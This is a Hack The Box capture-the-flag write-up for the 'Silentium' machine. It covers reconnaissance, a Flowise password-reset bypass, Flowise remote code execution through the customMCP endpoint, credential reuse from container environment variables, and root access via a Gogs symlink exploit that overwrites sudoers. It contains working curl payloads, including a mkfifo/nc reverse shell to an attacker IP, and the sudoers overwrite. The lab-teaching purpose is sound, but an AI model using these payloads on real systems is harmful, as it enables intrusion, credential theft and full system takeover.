# Silentium

## Recon

```
nmap -A -p 22,80 10.129.56.69 -oN NMAP_SCAN
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-11 17:36 +0530
Nmap scan report for 10.129.56.69
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   214.79 ms 10.10.14.1
2   212.93 ms 10.129.56.69

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.02 seconds
```

- Found ports 22,80 
- Let's add the domain silentium.htb to /etc/hosts file 
```
echo "10.129.56.69 silentium.htb" | sudo tee -a /etc/hosts 
[sudo] password for light: 
10.129.56.69 silentium.htb
```

- Now visit the site in the browser. http://silentium.htb

![port80](Data/silentium.png)

## Enumeration

- I performed subdomain enumeration and found an interesting subdomain.

```
 ffuf -u http://silentium.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.silentium.htb" -fc 301

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://silentium.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.silentium.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
________________________________________________

staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 223ms]
:: Progress: [19966/19966] :: Job [1/1] :: 180 req/sec :: Duration: [0:01:50] :: Errors: 0 ::
```
- Let's add it to the /etc/hosts file 

```
echo "10.129.56.69 staging.silentium.htb" | sudo tee -a /etc/hosts
```
- now visit the site http://staging.silentium.htb
- We got a flowise login portal

![screenshot](Data/silentium2.png)

- FlowiseAI Flowise is an open-source low-code tool for developers to build customized large language model (LLM) applications and AI agents. 
- After some research, I found that Flowise has a vulnerability [CVE-2026-41276](https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-f6hc-c5jr-878p), which allows remote attackers to bypass authentication 
- The vulnerability exists in the reset password. 

- But before that, we need a valid email ID. I found the following names on the site

![screenshot](Data/silentium3.png) 

- So I tried these emails in the rest password endpoint.

```
marcusthorne@silentium.htb
elenarossi@silentium.htb
ben@silentium.htb
```
- **ben@silentium.htb** is the valid email.

- Flowise allows users to reset forgotten passwords using a token emailed to the email address associated with their account. 
- A token is sent to the user's email when a request is made to the **"/api/v1/account/forgot-password"** endpoint.
- Users will submit this token along with their new password to the **"/api/v1/account/reset-password"** endpoint. And if it is submitted within sufficient time (15 minutes by default, or the value of the PASSWORD_RESET_TOKEN_EXPIRY_IN_MINUTES environment variable), the user will be able to change their password.
- The **resetPassword()** method of the AccountService class is responsible for handling such requests. This method will first retrieve the user's account information based on their email address, including the reset token value. 

![screenshot](Data/silentium4.png)

- The method will then check if the reset token provided matches the one stored in the user's account, and that the token hasn't expired, before changing that user's password.
- From the above screenshot, we can retrieve the secret token. Simply copy it to change Ben's password.

![screenshot](Data/silentium5.png)

- Now, log in using the email and the new password.
- After logging in, I found the version of the flowise

![screenshot](Data/silentium6.png)

- On further research i found the the above version 3.0.5 is vulnerable to remote code execution [CVE-2025-59528](https://github.com/advisories/GHSA-3gcm-f6qx-ff7p)
- Well Flowise is used to develop llm's and AI agents. There is a functionality that allows users to input configuration settings for connecting to an external MCP (Model Context Protocol) server.
- This can be achives by **/api/v1/node-load-method/customMCP** endpoint and the config is served via **mcpServerConfig** parameter.
- inside the **convertToValidJSONString** function, user input is directly passed to the Function() constructor, which evaluates and executes the input as JavaScript code.
- Since this runs with full node.js runtime privileges, we can access dangerous modules such as **child_process** and **fs**.

## payload for RCE

```
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"curl http://10.10.15.136:8000\");return 1;})()})"
    }
  }'
 ```
 - ***Note: Replace the Authorization Barer value with the api key of your own***
 
 ![screenshot](Data/silentium7.png)

 - First, I tried to check whether the payload is working or not, so I made a simple curl request to the web server I control.

 ![screenshot](Data/silentum8.png)

 - As you can see, we received a request. Now let's get a revshell.
 - **Payload: **
 ```
	curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
	  -H "Content-Type: application/json" \
	  -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
	  -d '{
	    "loadMethod": "listActions",
	    "inputs": {
	      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.136 4444 >/tmp/f\");return 1;})()})" 
	    }
	  }'
```
- Start a listener 
```
nc -lnvp 4444
```

- Then run the above payload, and bam!, we got the rev shell

```
 nc -lnvp 4444                                                                      1m 3s
listening on [any] 4444 ...
connect to [10.10.15.136] from (UNKNOWN) [10.129.56.184] 45237
/bin/sh: can't access tty; job control turned off
/ # whoami
root
/ # 
```
- We are landed inside the Docker container.

## Escaping Docker 

- First thing I did was check for env, and I found something interesting.
```
/ # env
FLOWISE_PASSWORD=F1l3_d0ck3r
ALLOW_UNAUTHORIZED_CERTS=true
NODE_VERSION=20.19.4
HOSTNAME=c78c3cceb7ba
YARN_VERSION=1.22.22
SMTP_PORT=1025
SHLVL=3
PORT=3000
HOME=/root
OLDPWD=/opt
SENDER_EMAIL=ben@silentium.htb
PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
JWT_ISSUER=ISSUER
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
LLM_PROVIDER=nvidia-nim
SMTP_USERNAME=test
SMTP_SECURE=false
JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
FLOWISE_USERNAME=ben
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DATABASE_PATH=/root/.flowise
JWT_TOKEN_EXPIRY_IN_MINUTES=360
JWT_AUDIENCE=AUDIENCE
SECRETKEY_PATH=/root/.flowise
PWD=/
SMTP_PASSWORD=r04D!!_R4ge
NVIDIA_NIM_LLM_MODE=managed
SMTP_HOST=mailhog
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
SMTP_USER=test
```
- you can see the password **SMTP_PASSWORD=r04D!!_R4ge** . Let's try to SSH using this password and ben as username.
- with user creds **ben:r04D!!_R4ge** we succesfully logged in as ben user.

## User.txt
```
cat user.txt 
a35cfb95b34ed2a6ec4ddf4178dfc61c
```

## Privilege Escalation

- In the **/opt** I found a directory called gogs.
- gogs is a self-hosted Git service written in Go, designed for easy and fast software development hosting

```
ben@silentium:/opt/gogs/gogs/custom/conf$ cat app.ini 
BRAND_NAME = Gogs
RUN_USER   = root
RUN_MODE   = prod

[server]
HTTP_ADDR        = 127.0.0.1
HTTP_PORT        = 3001
DOMAIN           = staging-v2-code.dev.silentium.htb
ROOT_URL         = http://staging-v2-code.dev.silentium.htb/
OFFLINE_MODE     = false
EXTERNAL_URL     = http://staging-v2-code.dev.silentium.htb:3001/
DISABLE_SSH      = false
SSH_PORT         = 22
START_SSH_SERVER = false

[database]
TYPE     = sqlite3
PATH     = /opt/gogs/data/gogs.db
HOST     = 127.0.0.1:5432
NAME     = gogs
SCHEMA   = public
USER     = gogs
PASSWORD = 
SSL_MODE = disable

[repository]
ROOT_PATH      = /root/gogs-repositories
DEFAULT_BRANCH = master
ROOT           = /root/gogs-repositories

[session]
PROVIDER = file

[log]
MODE      = file
LEVEL     = Info
ROOT_PATH = /opt/gogs/log

[security]
INSTALL_LOCK = true
SECRET_KEY   = sdsrcxSm0iC7wDO

[email]
ENABLED = false

[auth]
REQUIRE_EMAIL_CONFIRMATION  = false
DISABLE_REGISTRATION        = false
ENABLE_REGISTRATION_CAPTCHA = true
REQUIRE_SIGNIN_VIEW         = false

[user]
ENABLE_EMAIL_NOTIFICATION = false

[picture]
DISABLE_GRAVATAR        = false
ENABLE_FEDERATED_AVATAR = false
```

- You can see from the config file that it is running on port 3001 and domain staging-v2-code.dev.silentium.htb.
- So, to access this from our attacker machine. I performed SSH local port forwarding.
- first add **staging-v2-code.dev.silentium.htb** to our /etc/hosts files .

```
 ssh -L 3001:staging-v2-code.dev.silentium.htb:3001 ben@staging-v2-code.dev.silentium.htb
```
- Now open a browser on your attacker machine and navigate to the following URL: http://staging-v2-code.dev.silentium.htb/

![screenshot](Data/silentium9.png)

- This application is vulnerable to [CVE-2025-8110](https://www.wiz.io/blog/wiz-research-gogs-cve-2025-8110-rce-exploit), a vulnerability in Gogs that allows an authenticated user to achieve remote code execution by abusing symbolic links inside a Git repository.

- This CVE-2025-8110 is a bypass for a patch for CVE-2024-55947
- The CVE-2024-55947 flaw abused a path traversal weakness in the **PutContents** API. It allowed an attacker to write files outside the git repository directory, granting the ability to overwrite sensitive system files or configuration files to achieve code execution. The maintainers addressed this by adding input validation on the path parameter.
- The fix implemented for the CVE-2024-55947 did not account for symbolic links.
- So an attacker commits a malicious symbolic link to overwrite files.  which can be leveraged to remote code execution.

### Step to Exploit CVE-2025-8110

- Register a new account and log in.
- Create a new repository and git clone it to your attacker machine and execute the commands below. We are trying to overwrite the sudoers.d file and give user Ben full powers. 
```
  ~/HackTheBox/Silentium ❯ git clone http://staging-v2-code.dev.silentium.htb/spider/getroot.git     
Cloning into 'getroot'...
warning: You appear to have cloned an empty repository.
hint: Using 'master' as the name for the initial branch. This default branch name
hint: will change to "main" in Git 3.0. To configure the initial branch name
hint: to use in all of your new repositories, which will suppress this warning,
hint: call:
hint:
hint: 	git config --global init.defaultBranch <name>
hint:
hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
hint: 'development'. The just-created branch can be renamed via this command:
hint:
hint: 	git branch -m <name>
hint:
hint: Disable this message with "git config set advice.defaultBranchName false"
```

```
  ~/HackTheBox/Silentium ❯ ls
NMAP_SCAN  getroot  reports
```

```
  ~/HackTheBox/Silentium ❯ cd getroot 

  ~/HackTheBox/Silentium/getroot   master ❯ ln -s /etc/sudoers.d/ben mysymlink

  ~/HackTheBox/Silentium/getroot   master ?1 ❯ ls -al
total 12
drwxrwxr-x 3 light light 4096 May 12 12:26 .
drwxrwxr-x 4 light light 4096 May 12 12:19 ..
drwxrwxr-x 6 light light 4096 May 12 12:26 .git
lrwxrwxrwx 1 light light   18 May 12 12:26 mysymlink -> /etc/sudoers.d/ben
```

```
  ~/HackTheBox/Silentium/getroot   master ?1 ❯ git add mysymlink

  ~/HackTheBox/Silentium/getroot   master +1 ❯ git commit -m "adding mysymlink" 
[master (root-commit) 706d49e] adding mysymlink
 1 file changed, 1 insertion(+)
 create mode 120000 mysymlink

  ~/HackTheBox/Silentium/getroot   master ❯ git push origin master
Enumerating objects: 3, done.
Counting objects: 100% (3/3), done.
Writing objects: 100% (3/3), 241 bytes | 241.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
Username for 'http://staging-v2-code.dev.silentium.htb': spider
Password for 'http://spider@staging-v2-code.dev.silentium.htb': 
To http://staging-v2-code.dev.silentium.htb/spider/getroot.git
 * [new branch]      master -> master
```
- No, we successfully committed our symlink, now let's overwrite it. 
- Go to profile in the dashboard, and applications, create a new api token.

![screenshot](Data/silentium10.png)
```
curl -X PUT \
  -H "Authorization: token db82d95dfc444db1022eba68f143b0bc1df6d5f3" \
  -H "Content-Type: application/json" \
  -d '{"message":"exploit","content":"YmVuIEFMTD0oQUxMKSBOT1BBU1NXRDogQUxM"}' \
  "http://staging-v2-code.dev.silentium.htb/api/v1/repos/spider/getroot/contents/mysymlink"
  ```
 - The above command uses the **api/v1/repos/spider/getroot/contents/mysymlink** endpoint to update the content of the symlink, but it overwrites the sudoers file
 - the content is base64 encoding of payload **ben ALL=(ALL) NOPASSWD: ALL**
 - and api token is sent via the authorization header

 ```
 ben@silentium:~$ sudo -l
Matching Defaults entries for ben on silentium:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User ben may run the following commands on silentium:
    (ALL) NOPASSWD: ALL
```
- Now you can see the sudoer file is successfully overwritten.

## Root.txt

```
ben@silentium:~$ sudo su
root@silentium:/home/ben# cat /root/root.txt
7885bd6f5e99e475c8cd815751afe975
root@silentium:/home/ben# 
```
